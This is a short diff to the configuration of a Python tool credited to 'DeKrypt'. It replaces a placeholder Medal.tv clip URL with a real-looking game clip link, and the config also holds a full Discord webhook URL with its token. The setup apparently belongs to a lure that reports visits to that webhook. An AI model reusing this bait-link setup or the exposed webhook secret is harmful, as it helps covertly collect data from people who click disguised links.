@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
-    "image": "https://medal.tv/clips/example-clip-id", # Changed to a Medal.tv clip URL
+    "image": "https://medal.tv/games/gta-v/clips/jYtqYNEAQsOoNGFK0?invite=cr-MSxpWkYsMzAwMzE0NTIw", # Changed to a Medal.tv clip URL
     "imageArgument": True, # Still allows URL argument to change the clip
     
     # CUSTOMIZATION #
